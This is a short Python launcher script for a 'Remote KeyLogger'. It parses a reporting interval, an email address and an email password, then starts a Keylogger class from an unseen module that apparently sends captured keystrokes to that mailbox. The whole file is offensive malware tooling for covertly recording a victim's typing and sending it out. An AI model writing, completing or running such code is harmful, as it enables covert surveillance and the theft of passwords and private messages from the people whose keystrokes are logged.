import keylogger
import argparse

#required args
parser = argparse.ArgumentParser()
parser.add_argument('--time',type=int, help = "time interval required seconds like -t 60", required=True)
parser.add_argument('--mail', help = "Mail requrired to Report for keylogs", required=True)
parser.add_argument('--password', help = "mail account password required",required=True)
args = parser.parse_args()
time = args.time
mail = args.mail
password = args.password
print("Remote KeyLogger Running....")
my_keylogger =  keylogger.Keylogger(time, mail, password)
my_keylogger.start()
